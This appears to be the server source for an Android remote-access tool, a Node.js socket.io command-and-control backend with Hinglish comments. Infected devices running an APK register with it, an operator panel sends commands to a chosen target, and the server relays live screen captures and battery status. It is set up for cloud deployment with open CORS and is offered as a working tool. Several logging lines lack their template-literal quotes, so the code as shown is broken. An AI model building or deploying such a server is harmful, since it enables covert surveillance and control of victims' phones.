const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require('path'); // path module zaroori hai

const app = express();
const server = http.createServer(app);

// CORS Policy (Cloud deployment ke liye zaroori)
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// ================== BADLAV YAHAN HAI ==================
// Static files (jaise panel.html) ko root folder se serve karein
app.use(express.static(__dirname));

// Jab koi root URL (/) khole, to panel.html file bhejein
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});
// =======================================================

// Connected devices ki list manage karne ke liye
let devices = [];

io.on("connection", (socket) => {
    console.log([+] Connection established: ${socket.id});

    // Naye device (APK) ke judne par
    socket.on('register_device', (data) => {
        const deviceId = socket.id;
        const deviceName = data.deviceName || 'Unknown Device';
        const battery = data.battery || '--';
        
        if (!devices.find(d => d.deviceId === deviceId)) {
            console.log([+] Device registered: ${deviceName} (${deviceId}));
            devices.push({ deviceId, deviceName, battery });
        }
        
        io.emit('devices_list', devices);
    });

    // Panel se bheje gaye command ko handle karein
    socket.on('panel_command', (command) => {
        if (!command.targetId) return;
        console.log([>] Command '${command.type}' sent to ${command.targetId});
        io.to(command.targetId).emit('server_command', command);
    });
    
    // Live screen data ko handle karein
    socket.on('live_screen_data', (data) => {
        if (!data.deviceId) return;
        io.emit('live_screen_update', data);
    });

    // Status (jaise battery) update ko handle karein
    socket.on('status_data', (data) => {
        if (!data.deviceId) return;
        const device = devices.find(d => d.deviceId === data.deviceId);
        if (device) {
            device.battery = data.battery;
        }
        io.emit('status_update', data);
        io.emit('devices_list', devices);
    });

    // Connection tootne par
    socket.on("disconnect", () => {
        console.log([-] Connection lost: ${socket.id});
        devices = devices.filter(d => d.deviceId !== socket.id);
        io.emit('devices_list', devices);
    });
});

// Dynamic Port (Render ke liye zaroori)
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(Server is listening on port ${PORT});
});
